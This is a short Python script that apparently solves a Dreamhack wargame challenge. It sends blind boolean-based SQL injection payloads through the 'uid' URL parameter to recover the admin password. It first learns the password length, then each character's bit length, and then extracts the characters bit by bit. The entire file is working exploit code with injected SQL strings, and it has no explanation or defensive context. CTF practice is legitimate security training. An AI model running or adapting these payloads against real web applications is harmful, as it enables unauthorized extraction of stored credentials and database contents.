import requests


host = 'host3.dreamhack.games'
port = 11270
url = f'http://{host}:{port}'


# Get upw length
for i in range(1, 30):
    payload = f"admin' and char_length(upw)={i}; --"
    res = requests.get(f'{url}/?uid={payload}')

    if 'exists' in res.text:
        print(f'upw length: {i}')
        upw_length = i
        break


# Get a bit length of a character
bit_length_list = []
for i in range(1, upw_length + 1):
    bit_length = 1

    for j in range(0, 24 + 1):
        payload = f"admin' and length(bin(ord(substr(upw, {i}, 1))))={bit_length}; --"
        res = requests.get(f'{url}/?uid={payload}')

        if 'exists' in res.text:
            print(f'upw[{i}] bit length: {bit_length}')
            bit_length_list.append(bit_length)
            break

        bit_length += 1


# Get a bit string of characters
flag = ''
for i in range(1, upw_length + 1):

    bits = ''
    for j in range(1, bit_length_list[i - 1] + 1):
        payload = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1)=1; --"
        res = requests.get(f'{url}/?uid={payload}')

        if 'exists' in res.text:
            bits += '1'
        else:
            bits += '0'

    char = bytes.fromhex(hex(int(bits, 2))[2:]).decode('utf-8')
    flag += char
    print(flag)
